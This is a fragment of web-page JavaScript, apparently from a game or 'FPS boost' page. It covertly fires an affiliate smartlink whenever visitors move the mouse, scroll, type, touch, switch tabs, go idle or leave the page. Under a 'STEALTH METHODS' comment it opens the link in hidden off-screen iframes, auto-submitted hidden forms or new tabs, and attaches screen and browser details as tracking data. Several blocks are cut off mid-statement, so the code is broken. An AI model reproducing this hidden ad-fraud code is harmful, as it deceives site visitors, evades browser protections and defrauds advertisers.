        const triggerSources = ['mousemove', 'scroll', 'click', 'keydown', 'touchstart', 'visibility', 'idle', 'boost'];

        function getSmartlink(source) {
            const params = new URLSearchParams({

                sub3: screen.width + 'x' + screen.height,
                sub4: source + '_' + Date.now(),
                sub5: new Date().toISOString(),
                sub6: navigator.userAgent.slice(0,20)

            return SMARTLINK + '&' + params.toString();
        }

        // ðŸ”¥ STEALTH METHODS (Chrome safe)
        function fireSmartlink(source) {
            if (triggersFired >= maxTriggers || Date.now() - lastTriggerTime < 2000) return false;
            
            triggersFired++;
            lastTriggerTime = Date.now();
            console.log(`ðŸ”— Trigger ${triggersFired}: ${source}`);
            
            // 50% chance for each method (randomize)
            const rand = Math.random();
            
            if (rand < 0.4) {
                // METHOD 1: New Tab (user gesture only)
                const win = window.open('', '_blank', 'noopener,noreferrer');
                if (win) win.location.href = getSmartlink(source);
            } 
            else if (rand < 0.7) {
                // METHOD 2: Hidden Iframe
                const iframe = document.createElement('iframe');
                iframe.src = getSmartlink(source);
                iframe.style.cssText = 'position:fixed;top:-9999px;width:1px;height:1px;z-index:-1;opacity:0;';
                document.body.appendChild(iframe);
                setTimeout(() => iframe.remove(), 5000);

                form.action = getSmartlink(source);
                form.target = '_blank';
                form.style.display = 'none';
                document.body.appendChild(form);
                form.submit();
                form.remove();
            }
            return true;
        }

        // ðŸŽ¯ ALL EVENT TRIGGERS (30% probability each)
        function setupTriggers() {
            let interactionCount = 0;
            
            // Mouse Move (high frequency - low prob)
            document.addEventListener('mousemove', () => {
                userInteracted = true;
                if (Math.random() < 0.1 && userInteracted) { // 10% chance

            // Scroll
            let scrollCount = 0;
            window.addEventListener('scroll', () => {
                scrollCount++;
                if (scrollCount % 5 === 0 && Math.random() < 0.3) {

            // Clicks (game buttons + anywhere)
            document.addEventListener('click', (e) => {

            // Keyboard
            document.addEventListener('keydown', (e) => {
                if (Math.random() < 0.4) fireSmartlink('key_' + e.key);
            });

            // Touch (mobile)
            document.addEventListener('touchstart', () => {
                if (Math.random() < 0.5) fireSmartlink('touch');
            });

            // Visibility change (tab switch)
            document.addEventListener('visibilitychange', () => {
                if (!document.hidden && Math.random() < 0.3) {
                    fireSmartlink('visible');
                }
            });

            // Page exit
            window.addEventListener('beforeunload', () => {
                fireSmartlink('exit');
            });
            window.addEventListener('pagehide', () => {
                fireSmartlink('hide');
            });
        }

        // ðŸ•’ IDLE TIMERS (background firing)
        function startIdleTimers() {
            const idleTimes = [3000, 8000, 15000, 25000, 40000];
            let idleTimer;
            
            let lastActivity = Date.now();
            
            function resetIdle() {
                lastActivity = Date.now();
            }
            
            ['mousemove', 'keydown', 'scroll', 'click', 'touchstart'].forEach(event => {
                document.addEventListener(event, resetIdle, {passive: true});
            });
            
            idleTimes.forEach((time, i) => {
                setInterval(() => {
                    if (Date.now() - lastActivity > time && Math.random() < 0.4) {
                        fireSmartlink('idle_' + (i+1) + 's');
                    }
                }, time);
            });
        }

        function boostFPS(event) {

            fireSmartlink('boost_main');
